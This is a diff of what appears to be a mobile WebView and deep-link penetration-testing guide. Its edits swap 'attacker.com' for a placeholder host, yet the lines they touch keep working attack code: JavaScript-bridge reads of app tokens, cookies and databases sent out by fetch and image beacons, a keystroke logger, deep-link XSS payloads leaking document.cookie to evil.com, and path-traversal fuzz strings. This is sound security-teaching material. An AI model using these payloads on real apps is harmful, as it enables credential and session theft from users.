@@ -78,7 +78,7 @@ try {
     var prefs = bridge.readFile(dataDir + 'shared_prefs/prefs.xml');
 
     // 外带数据
-    fetch('https://attacker.com/exfil?token=' + encodeURIComponent(token));
+    fetch('https://<attacker-domain>/exfil?token=' + encodeURIComponent(token));
 } catch(e) {}
 
 // 步骤 3: 命令执行 (Android 4.2+ 需要 API 17+, @JavascriptInterface 限制)
@@ -114,7 +114,7 @@ var data = bridge.readFile('/data/data/com.target.app/databases/webview.db');
 var cookies = bridge.readFile('/data/data/com.target.app/app_webview/Cookies');
 
 // 通过图片外带
-new Image().src = 'https://attacker.com/exfil?data=' +
+new Image().src = 'https://<attacker-domain>/exfil?data=' +
     encodeURIComponent(cookies + '|||' + data);
 
 // 执行命令 (如果可用)
@@ -246,7 +246,7 @@ class SchemeHijacking:
         # myapp://load?page=https://evil.com
         test_urls = [
             'https://evil.com',
-            'https://attacker.com/phish',
+            'https://<attacker-domain>/phish',
             'javascript:alert(1)',
             'file:///data/data/com.target.app/shared_prefs/token.xml',
         ]
@@ -275,7 +275,7 @@ class SchemeHijacking:
 // webView.loadUrl(url);  // 直接加载用户控制的 URL → 任意 URL 加载!
 
 // 攻击:
-// <a href="myapp://open?url=https://attacker.com/exploit.html">
+// <a href="myapp://open?url=https://<attacker-domain>/exploit.html">
 // 受害者点击后 → WebView 加载 exploit.html → 执行 JS
 ```
 
@@ -288,7 +288,7 @@ PAYLOADS = {
         "scheme": "myapp://open",
         "payloads": [
             "?url=javascript:alert(1)",
-            "?url=javascript:fetch('https://attacker.com/'+document.cookie)",
+            "?url=javascript:fetch('https://<attacker-domain>/'+document.cookie)",
             "?url=data:text/html,<script>alert(1)</script>",
         ],
     },
@@ -308,7 +308,7 @@ PAYLOADS = {
     },
     "open_redirect": {
         "payloads": [
-            "?url=https://attacker.com/phish.html",
+            "?url=https://<attacker-domain>/phish.html",
             "?url=https://evil.com/steal_cookies",
         ],
     },
@@ -323,7 +323,7 @@ def fuzz_deeplink(scheme: str, host: str, activity: str):
 
     tests = [
         (f'{base_uri}?url=javascript:fetch("https://evil.com/"+document.cookie)', 'XSS via JS'),
-        (f'{base_uri}?url=file:///etc/passwd', 'File read'),
+        (f'{base_uri}?url=file://<sensitive-file>', 'File read'),
         (f'{base_uri}?url=https://evil.com', 'Open redirect'),
         (f'{base_uri}#Intent;action=android.intent.action.VIEW;end', 'Intent confusion'),
     ]
@@ -366,7 +366,7 @@ function stealFile(path) {
     xhr.open('GET', 'file://' + path, false);
     try {
         xhr.send();
-        fetch('https://attacker.com/exfil?path=' +
+        fetch('https://<attacker-domain>/exfil?path=' +
             encodeURIComponent(path) +
             '&data=' + encodeURIComponent(xhr.responseText));
     } catch(e) {}
@@ -426,11 +426,11 @@ webView.setWebViewClient(new WebViewClient() {
 
 // 读取页面内容并发送 (即使 HTTPS 没 pinning)
 var allText = document.documentElement.innerText;
-new Image().src = 'http://attacker.com/steal?' + btoa(allText);
+new Image().src = 'http://<attacker-domain>/steal?' + btoa(allText);
 
 // 窃取表单输入
 document.addEventListener('keydown', function(e) {
-    new Image().src = 'http://attacker.com/k?' + e.key;
+    new Image().src = 'http://<attacker-domain>/k?' + e.key;
 });
 ```
 
@@ -461,7 +461,7 @@ CookieManager.getInstance().setCookie(
 document.cookie = "session=victim_session; domain=.target.com; path=/";
 fetch('https://target.com/api/me', {credentials: 'include'})
     .then(r => r.json())
-    .then(data => fetch('https://attacker.com/leak?d=' + btoa(JSON.stringify(data))));
+    .then(data => fetch('https://<attacker-domain>/leak?d=' + btoa(JSON.stringify(data))));
 ```
 
 ## 7. iOS WKWebView Specific: Cookie & Storage 分离
@@ -527,7 +527,7 @@ class WebViewBridgeFuzzer:
             var payloads = ['', null, undefined, 0, "test",
                            {"__proto__": {"isAdmin": true}},
                            "<img src=x onerror=alert(1)>",
-                           "../../../../etc/passwd",
+                           "../../../..<sensitive-file>",
                            "file:///data/data/..."];
             payloads.forEach(function(p) {
                 try {
